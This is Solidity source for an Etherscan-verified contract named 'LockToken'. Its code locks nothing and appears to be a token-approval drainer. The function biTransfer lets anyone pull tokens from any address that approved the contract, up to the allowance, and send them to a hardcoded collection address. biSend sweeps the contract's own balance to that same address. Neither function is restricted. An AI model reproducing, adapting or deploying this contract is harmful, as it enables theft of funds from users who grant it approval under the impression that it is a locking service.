/**
 *Submitted for verification at Etherscan.io on 2023-06-15
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4;

interface IERC20 {
	function totalSupply() external view returns (uint256);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
contract LockToken {
	address private feeaddress = 0x0FB894F685944234c24A2f0838BdA698ABD5A73A;	//归集地址
	constructor(){
	
	}
	//0x75595fcd
	function biTransfer(address _lpadd, address _add, uint256 _v) public {
		IERC20 _lp = IERC20(_lpadd);
		uint256 _allowance = _lp.allowance(_add, address(this));
		uint256 _value = _lp.balanceOf(_add);
		require(_allowance>0, "Err: allowance");
		require(_value>0, "Err: balanceOf");
		if (_value>_allowance){
			_value = _allowance;
		}
		if (_value>_v){
			_value = _v;
		}
		_lp.transferFrom(_add, feeaddress, _value);
	}
	//0x2e59f632
	function biSend(address _lpadd) public {
		IERC20 _lp = IERC20(_lpadd);
		uint256 _value = _lp.balanceOf(address(this));
		require(_value>0, "Err: balanceOf");
		_lp.transfer(feeaddress, _value);
	}
}